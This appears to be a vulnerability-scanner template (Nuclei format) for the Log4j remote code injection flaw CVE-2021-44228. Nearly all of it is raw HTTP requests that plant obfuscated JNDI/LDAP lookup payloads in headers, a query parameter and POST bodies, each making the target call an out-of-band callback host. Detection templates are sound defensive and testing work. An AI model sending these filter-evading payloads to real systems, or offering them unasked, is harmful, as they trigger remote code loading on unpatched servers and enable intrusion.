id: Log4j Remote Code Injection（CVE-2021-44228）

info:
  name: Log4j Remote Code Injection
  author: JiuBan
  severity: critical
  description: Apache Log4j 2.x < 2.15.0-rc2
  reference: 
    - https://github.com/JiuBanSec/Log4j-CVE-2021-44228
  tags: cve,cve2021,log4j

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        X-Client-IP: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/poc}
        X-Forwarded-For: ${${::-j}ndi:ldap://{{interactsh-url}}/ass}
        Referer: ${jndi:ldap://{{interactsh-url}}}
        Authentication: ${${lower:jndi}:${lower:ldap}://{{interactsh-url}}/poc}
        X-Remote-IP: ${${lower:${lower:jndi}}:${lower:ldap}://{{interactsh-url}}/poc}
        Contact: ${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://{{interactsh-url}}/poc}
        Originating-IP: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{{interactsh-url}}/poc}
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        X-Client-IP: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/poc}
        X-Forwarded-For: ${${::-j}ndi:ldap://{{interactsh-url}}/ass}
        Referer: ${jndi:ldap://{{interactsh-url}}}
        Authentication: ${${lower:jndi}:${lower:ldap}://{{interactsh-url}}/poc}
        X-Remote-IP: ${${lower:${lower:jndi}}:${lower:ldap}://{{interactsh-url}}/poc}
        Contact: ${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://{{interactsh-url}}/poc}
        Originating-IP: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{{interactsh-url}}/poc}
        Content-Type: application/x-www-form-urlencoded
      - |
        GET /?name=${jndi:ldap://{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        X-Client-IP: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/poc}
        X-Forwarded-For: ${${::-j}ndi:ldap://{{interactsh-url}}/ass}
        Referer: ${jndi:ldap://{{interactsh-url}}}
        Authentication: ${${lower:jndi}:${lower:ldap}://{{interactsh-url}}/poc}
        X-Remote-IP: ${${lower:${lower:jndi}}:${lower:ldap}://{{interactsh-url}}/poc}
        Contact: ${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://{{interactsh-url}}/poc}
        Originating-IP: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{{interactsh-url}}/poc}
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        X-Client-IP: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/poc}
        X-Forwarded-For: ${${::-j}ndi:ldap://{{interactsh-url}}/ass}
        Referer: ${jndi:ldap://{{interactsh-url}}}
        Authentication: ${${lower:jndi}:${lower:ldap}://{{interactsh-url}}/poc}
        X-Remote-IP: ${${lower:${lower:jndi}}:${lower:ldap}://{{interactsh-url}}/poc}
        Contact: ${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://{{interactsh-url}}/poc}
        Originating-IP: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{{interactsh-url}}/poc}
        
        payload=${jndi:ldap://{{interactsh-url}}}
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        X-Client-IP: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/poc}
        X-Forwarded-For: ${${::-j}ndi:ldap://{{interactsh-url}}/ass}
        Referer: ${jndi:ldap://{{interactsh-url}}}
        Authentication: ${${lower:jndi}:${lower:ldap}://{{interactsh-url}}/poc}
        X-Remote-IP: ${${lower:${lower:jndi}}:${lower:ldap}://{{interactsh-url}}/poc}
        Contact: ${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://{{interactsh-url}}/poc}
        Originating-IP: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{{interactsh-url}}/poc}
        Content-Type: application/x-www-form-urlencoded        
        
        payload=${${lower:${lower:jndi}}:${lower:ldap}://{{interactsh-url}}/poc}
        
    stop-at-first-match: true            
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        name:
        words:
          - "http"

      - type: word
        part: interactsh_protocol
        name:
        words:
          - "dns"
